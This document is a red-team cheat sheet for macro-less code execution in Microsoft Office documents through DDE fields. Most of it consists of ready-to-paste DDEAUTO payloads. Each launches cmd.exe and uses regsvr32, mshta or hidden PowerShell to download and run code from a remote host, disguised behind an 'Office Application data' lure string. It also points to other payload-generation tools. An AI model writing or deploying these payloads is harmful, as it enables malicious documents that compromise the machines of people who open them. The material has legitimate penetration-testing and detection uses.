## Macro-Less Code Execution in MS Office via DDE (Dynamic Data Exchange) techniques Cheat-Sheet

- Using `regsvr32` _*.sct_ files technique:
```
DDEAUTO C:\\Programs\\Microsoft\\Office\\MSword.exe\\..\\..\\..\\..\\Windows\\System32\\cmd.exe "/c Microsoft Office Application data   || regsvr32 /s /n /u /i:http://192.168.56.101/empire2.sct scrobj.dll"
```

- Using `HTA` files technique:
```
DDEAUTO C:\\Programs\\Microsoft\\Office\\MSword.exe\\..\\..\\..\\..\\Windows\\System32\\cmd.exe "/c Microsoft Office Application data   || mshta http://192.168.56.101/poc.hta"
```

- Method from Empire - unfortunately unable to hide 'powershell.exe -NoP -sta -NonI' sequence
```
DDEAUTO C:\\Microsoft\\Programs\\Office\\MSWord.exe\\..\\..\\..\\..\\Windows\\System32\\cmd.exe "/k  powershell.exe -NoP -sta -NonI -W Hidden $e=(New-Object System.Net.WebClient).DownloadString('http://192.168.56.101/default.ps1');powershell -noP -sta -w 1 -enc $e "
```

- CactusTorch DDE can also generate files in **JS** and **VBS** formats.
They will utilize `cscript` as a file interpreter.

- Another option is to use scripts by _Dominic Spinosa_ found [here](https://github.com/0xdeadbeefJERKY/Office-DDE-Payloads)

- Another option is to stick with `Unicorn` by _Dave Kennedy_


## Sources

- https://medium.com/red-team/dde-payloads-16629f4a2fcd